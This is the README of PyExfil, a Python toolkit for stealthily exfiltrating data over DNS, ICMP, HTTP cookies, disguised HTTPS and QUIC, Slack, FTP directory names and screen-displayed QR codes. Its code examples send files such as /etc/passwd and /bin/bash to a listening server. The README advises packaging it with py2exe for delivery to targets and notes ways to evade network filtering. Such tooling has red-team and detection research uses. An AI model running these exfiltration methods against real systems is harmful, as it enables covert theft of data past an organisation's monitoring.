# PyExfil

## Abstract
This started as a PoC project but has later turned into something a bit more. Currently it's an Alpha-Alpha stage package, not yet tested (and will appriciate any feedbacks and commits) designed to show several techniques of data exfiltration is real world scenarios. Currently here are what the package supports and what is allows is:

* DNS query.
* HTTP Cookie.
* ICMP (8).
* NTP requests.
* BGP Open.
* HTTPS Replace Certificate.
* QUIC - No Certificate.
* Slack Exfiltration
* POP3 Authentication (as password) - Idea thanks to [Itzik Kotler](https://github.com/ikotler)
* FTP MKDIR technique - Idea thanks to [Itzik Kotler](https://github.com/ikotler)

Package is still not really usable and will provide multiple issues. Please wait for a more reliable version to come along. You can track changes at the official [GitHub page](http://ytisf.github.io/PyExfil/).
The release of Symantec's Regin research was the initiator of this module. It is inspired by some of the features of [Regin](http://www.symantec.com/connect/blogs/regin-top-tier-espionage-tool-enables-stealthy-surveillance). Go read about it :)

## Server Installation
All requirements can be met with a `pip install --user -r requirments.txt`. After that the server is easy to execute. Notice that in some cases you might want to use `py2exe` before delivering the package to the code you want to operate.

## Techniques

### Physical - QR

So recently we have decided to impliment some physical data exfiltration techniques assuming some networks might be airgapped from any internet connectivity. So this is the first one. It will encode a file in several QR codes, display them on the screen one by one and it comes with a decoder to recompile that into the file itself.

It was written under MacOS so for any bugs please report to us so that we can fix them.

#### Prepare
```bash
brew tap homebrew/science
brew install opencv
pip install --user -r pyexfil/physical/qw/requirements.txt
```

#### To QR Codes
```python
from pyexfil.physical.qr.generator import CreateQRs, PlayQRs

if __name__ == "__main__":
    if CreateQRs('/etc/passwd'):
        sys.stdout.write("Will now start playing the QRs.\n")
        time.sleep(DELAY)
        PlayQRs()  # This will play the QRs on screen
    else:
        sys.stderr.write("Something went wrong with creating QRs.\n")
        sys.exit(1)

```

#### From QRs to File
```python
from pyexfil.physical.qr.decoder import startFlow, DIR_MODE, CAM_MODE

if __name__ == "__main__":
    startFlow(mode=DIR_MODE) # will use data in 'output' directory.
    startFlow(mode=CAM_MODE) # will use data from camera

```

### DNS
This will allow establish of a listener on a DNS server to grab incoming DNS queries. It will then harvest them for files exfiltrated by the client. It **does not** yet allow simultaneous connections and transfers. DNS packets will look good to most listeners and *Wireshark* and *tcpdump* (which are the ones that have been tested) will show normal packet and not a 'malformed packet' or anything like that.

### HTTPS Replace certificate
With this method you are configuring an HTTP server to impersonate the certificate. When you exfiltrate data, it will use the original server to exchange certificates with the duplicating server (port forwarding) and then, when this is complete, transmit the data with AES encryption but wraps it up as SSL Application Data as there is no real way of telling this.

#### Server Setup - String Mode
```python
from pyexfil.HTTPS.https_server import HTTPSExfiltrationServer

server = HTTPSExfiltrationServer(host="127.0.0.1", key="123", port=443, max_connections=5, max_size=8192)
server.startlistening()
```

#### Client Setup - String Mode
```python
from pyexfil.HTTPS.https_client import HTTPSExfiltrationClient

client = HTTPSExfiltrationClient(host='127.0.0.1', key="123", port=443, max_size=8192)
client.sendData("ABC")
client.sendData("DEFG")
client.close()
```

#### Server Setup - File Mode
```python
from pyexfil.HTTPS.https_server import HTTPSExfiltrationServer

server = HTTPSExfiltrationServer(host="127.0.0.1", key="123", port=443, max_connections=5, max_size=8192, file_mode=True)
server.startlistening()
```

#### Client Setup - File Mode
```python
from pyexfil.HTTPS.https_client import HTTPSExfiltrationClient

client = HTTPSExfiltrationClient(host='127.0.0.1', key="123", port=443, max_size=8192)
client.sendFile("/etc/passwd")
client.close()
```


### HTTP Cookie
Exfiltration of files over HTTP protocol but over the Cookies field. The strong advantage of this is that the cookie field is supposed to be random noise to any listener in the middle and therefore is very difficult to filter.

### ICMP
Uses ICMP 8 packets (echo request) to add a file payload to it. It reimplemented ICMP ping requests and some sniffers are known to capture it as malformed packets. Wireshark currently displays it as a normal packet.

### FTP MKDIR
FTP MKDIR is a technique based on using an FTP server and assuming that the corporate is using an active MiTM to disable file upload. With this in mind, the file is then compressed using `zlib` and base64 encoded (to be ASCII representable) and then splitted into chunks. Each chunk is then made the name of a directory using MKDIR command (which is not a file upload and should be enabled).
It can be used in the following manner:

#### File Exfil
```python
# Port is by default 21, but can be changed with 'port=2121'
# Credentials are () but can be added with: creds=('user','pass')
# TLS is disabled by default but could be added with tls=True
FTPexf = FTPExfiltrator(server="10.211.55.15", file2exfil="/bin/bash")
FTPexf.get_file_chunks()
FTPexf.build_final_chunks()
FTPexf.send_chunks()
```

#### File Reconstruction
```python
# Directory argument can be added with: dir="/home/user/directory"
FTPHand = GetContent()
FTPHand.get_file()
```

### Slack Exfiltration
Slack exfiltration uses the Slack API to move files around. Please notice you will need to tweak the code to make it stealthy. Right now it is defaultly designed to be noisy and appear on the user's log to make sure you're using this in a 'good' manner.

#### Slack Server
```python
from pyexfil.Slack.slack_server import SlackExfiltrator

slackExf = SlackExfiltrator(slackSlaveID="11111FD", slackToken="xoxo-abc", encKey="Abc!23")
slackExf._connect2Slack()
slackExf.Listen()
```

#### Slack Client

```python
from pyexfil.Slack.slack_server import SlackExfiltrator

slackExf = SlackExfiltrator(slackID="11111FD", slackToken="xoxo-abc", encKey="Abc!23")
slackExf._connect2Slack()
slackExf.ExfiltrateFile(file_path="/etc/passwd")
```


### QUIC
In this method, we exfiltrate files over UDP 443 as to look like QUIC. Currently, it is written as first PoC and less as a functional tool. For example, will only work with one file at a time and not concurrent. Vailidy only checks MD5 and not individual packets (server does not request missing chunks from client, which it should). Nevertheless, this seems to work fine in several checks we've done and seems viable exfiltration for single file.

In the future, we should add the things mentioned above. Currently, this does not seem like there is a profiling that can be done on these streams as they appear to be identified by all interceptors as QUIC and unresolvable to the content (while QUIC uses true SSL, this uses AES which still gives a binary blob which is meaningless).

#### Server
```python
from pyexfil.QUIC.quic_server import HTTPSExfiltrationServer

server = HTTPSExfiltrationServer(host="127.0.0.1", key="123")
server.startlistening()
```

#### Client
```python
from pyexfil.QUIC.quic_client import QUICClient

client = QUICClient(host='127.0.0.1', key="123", port=443)      # Setup a server

# This part is just for debugging and printing, no read use
a = struct.unpack('<LL', client.sequence)                       # Get CID used
a = (a[1] << 32) + a[0]
sys.stdout.write("[.]\tExfiltrating with CID: %s.\n" % a)

client.sendFile("/etc/passwd")                                  # Exfil File
client.close()
```

## Future Stuff
### Version Alpha
- [X] Check why HTTP Cookie exfiltration keeps failing CRC checks. (Fixed in patch #7 by Sheksa)
- [X] Add NTP exfiltration. (Thanks to barachy for the idea)
- [X] Complete NTP listener.
- [X] BGP Data exfiltration + listener.
- [X] FTP MKDIR Exfiltrator & combiner.

### Version Beta
- [x] More QA needed and fast!
- [ ] Write a proper Documentation.
- [ ] Fix that poorly written *setup.py*.

### Version 1.0
- [ ] Enable simultaneous support for all data exfiltration methods.
- [ ] Unify all to a single platform.
- [ ] Testing for py2exe support.
- [ ] Translate module to C Linux.
- [ ] Get a damn logo :)

## Thanks
Thanks [Wireshark](http://wireshark.com/) for your awesome wiki and tool. Especially [packet dumps](http://wiki.wireshark.org/SampleCaptures).
Thanks to barachy and AM for ideas on protocols to use.
